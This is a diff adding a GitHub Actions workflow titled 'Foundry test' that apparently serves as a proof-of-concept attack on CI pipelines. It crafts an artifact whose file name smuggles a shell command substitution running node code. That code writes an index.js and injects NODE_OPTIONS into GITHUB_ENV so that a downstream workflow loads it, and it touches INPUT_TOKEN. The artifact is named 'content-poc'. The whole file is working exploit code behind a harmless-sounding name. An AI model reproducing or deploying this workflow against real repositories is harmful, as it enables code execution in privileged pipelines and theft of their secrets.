@@ -1,0 +1,23 @@
+name: Foundry test
+
+on:
+  pull_request:
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: craft attacker artifact
+        run: |
+          mkdir -p out
+          PAY=$(cat <<'PAYLOAD'
+          $(node -e 'f=require(`fs`);f.writeFileSync(`index.js`,`console.log(process.env.INPUT_TOKEN.length)`);f.appendFileSync(process.env.GITHUB_ENV,`NODE_OPTIONS=--require=.`+String.fromCharCode(10));console.log(`pr_number.txt`)').txt
+          PAYLOAD
+          )
+          printf 'x\n' > "out/$PAY"
+          printf '121\n' > out/pr_number.txt
+          ls -la out
+      - uses: actions/upload-artifact@v4
+        with:
+          name: content-poc
+          path: out
